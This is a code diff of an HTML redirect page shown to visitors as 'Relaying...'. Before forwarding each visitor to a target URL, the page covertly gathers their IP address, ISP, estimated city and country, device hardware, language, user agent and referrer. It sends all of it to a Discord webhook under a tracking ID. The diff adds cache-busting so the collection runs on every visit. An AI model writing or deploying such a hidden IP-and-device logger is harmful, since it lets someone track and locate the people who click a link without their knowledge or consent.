@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Relaying...</title>
+    
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
     <style>
         body {
             font-family: sans-serif;
@@ -42,12 +47,11 @@
         // ----------------
 
         async function processRedirect() {
-            // 1. URLパラメータの取得
+            // パラメータ取得
             const params = new URLSearchParams(window.location.search);
             const targetUrl = params.get('url');
             const uniqueId = params.get('id');
 
-            // ターゲットがない場合の処理
             if (!targetUrl) {
                 document.body.innerHTML = "<p>Error: No destination URL specified.</p>";
                 return;
@@ -59,15 +63,18 @@
             }, 5000);
 
             try {
-                // 2. 情報収集
-                
                 // A. ネットワーク情報 (ipapi.co を使用)
+                // 【対策】キャッシュ回避のため、URL末尾にランダムな数字(?t=...)を付与
                 let netInfo = {};
                 try {
-                    const res = await fetch('https://ipapi.co/json/');
+                    const randomParam = Math.floor(Math.random() * 100000);
+                    const res = await fetch(`https://ipapi.co/json/?t=${randomParam}`, {
+                        cache: 'no-store' // 【対策】明示的にキャッシュなしを指定
+                    });
                     netInfo = await res.json();
                 } catch (e) {
-                    netInfo = { error: 'IP取得失敗' };
+                    netInfo = { error: 'IP取得失敗', ip: 'Unknown' };
+                    console.error(e);
                 }
 
                 // B. ブラウザ・デバイス情報
@@ -79,12 +86,11 @@
                 const userAgent = navigator.userAgent;
                 const referrer = document.referrer || '直接アクセスまたは不明';
 
-                // 3. Discordへのメッセージ作成
-                // 見やすいようにフィールド形式を使います
+                // Discord Embedメッセージ作成
                 const payload = {
                     embeds: [{
                         title: "🚨 アクセス検知 (詳細追跡)",
-                        color: 15548997, // 赤っぽい色
+                        color: 15548997, 
                         fields: [
                             { name: "🆔 追跡ID", value: uniqueId || "なし", inline: true },
                             { name: "🔗 遷移先URL", value: targetUrl, inline: true },
@@ -92,7 +98,7 @@
                             // ネットワーク情報
                             { name: "🌍 IPアドレス", value: netInfo.ip || "不明", inline: false },
                             { name: "🏢 プロバイダ(ISP)", value: netInfo.org || "不明", inline: true },
-                            { name: "📍 位置(推定)", value: `${netInfo.city}, ${netInfo.region}, ${netInfo.country_name}`, inline: true },
+                            { name: "📍 位置(推定)", value: `${netInfo.city || ''}, ${netInfo.region || ''}, ${netInfo.country_name || ''}`, inline: true },
                             
                             // デバイス情報
                             { name: "💻 プラットフォーム", value: platform, inline: true },
@@ -100,29 +106,31 @@
                             { name: "🗣️ 言語", value: language, inline: true },
                             { name: "⚙️ ハードウェア", value: `CPU: ${cores}コア / RAM: ${memory}`, inline: true },
                             
-                            // ユーザーエージェント（生データ）
+                            // ユーザーエージェント
                             { name: "🕵️ User Agent", value: userAgent.substring(0, 1024), inline: false },
                             
                             // その他
-                            { name: "↩️ リファラ(流入元)", value: referrer, inline: false }
+                            { name: "↩️ リファラ", value: referrer, inline: false }
                         ],
                         footer: {
-                            text: `Time: ${new Date().toLocaleString('ja-JP')}`
+                            text: `Time: ${new Date().toLocaleString('ja-JP')} (No-Cache Mode)`
                         }
                     }]
                 };
 
-                // 4. Webhook送信
+                // C. Webhook送信
+                // 【対策】POST送信は通常キャッシュされませんが、念の為 no-store を指定
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(payload),
+                    cache: 'no-store'
                 });
 
             } catch (e) {
                 console.error(e);
             } finally {
-                // 5. リダイレクト実行
+                // リダイレクト実行
                 clearTimeout(safetyTimeout);
                 window.location.replace(targetUrl);
             }
